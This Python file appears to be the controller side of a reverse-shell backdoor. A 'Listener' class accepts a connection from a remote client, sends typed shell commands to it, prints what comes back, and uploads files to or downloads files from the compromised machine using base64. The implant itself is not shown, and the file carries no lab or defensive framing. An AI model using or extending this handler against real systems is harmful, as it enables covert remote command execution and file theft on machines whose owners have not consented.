import socket
import base64
from socket_utils import receive_json, send_json


class Listener:
    def __init__(self, ip, port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print("Listening on port 8080")
        (self.my_connection, my_address) = my_listener.accept()
        print("Connection Ok from" + str(my_address[0]))

    def send_json(self, data):
        send_json(self.my_connection, data)

    def json_receive(self):
        return receive_json(self.my_connection)

    def command_execution(self, command_input):
        self.send_json(command_input)
        if command_input[0] == "quit":
            return "Connection closed."
        return self.json_receive()

    @staticmethod
    def save_file(path, content):
        with open(path, "wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download Complete"

    @staticmethod
    def get_file_content(path):
        with open(path, "rb") as my_file:
            return base64.b64encode(my_file.read()).decode()

    def start_listening(self):
        try:
            while True:
                raw_command = input("Enter a command: ").strip()
                if not raw_command:
                    continue

                command_input = raw_command.split()
                if command_input[0] == "upload" and len(command_input) > 1:
                    my_file_content = self.get_file_content(command_input[1])
                    command_input.append(my_file_content)

                # Dispatch the command and print the client's response verbatim.
                command_outputs = self.command_execution(command_input)

                if command_input[0] == "download" and len(command_input) > 1 and isinstance(command_outputs, str):
                    command_outputs = self.save_file(command_input[1], command_outputs)
                print(command_outputs)
                if command_input[0] == "quit":
                    break
        finally:
            self.my_connection.close()


my_socket_listener = Listener("127.0.0.1", 8080)
my_socket_listener.start_listening()
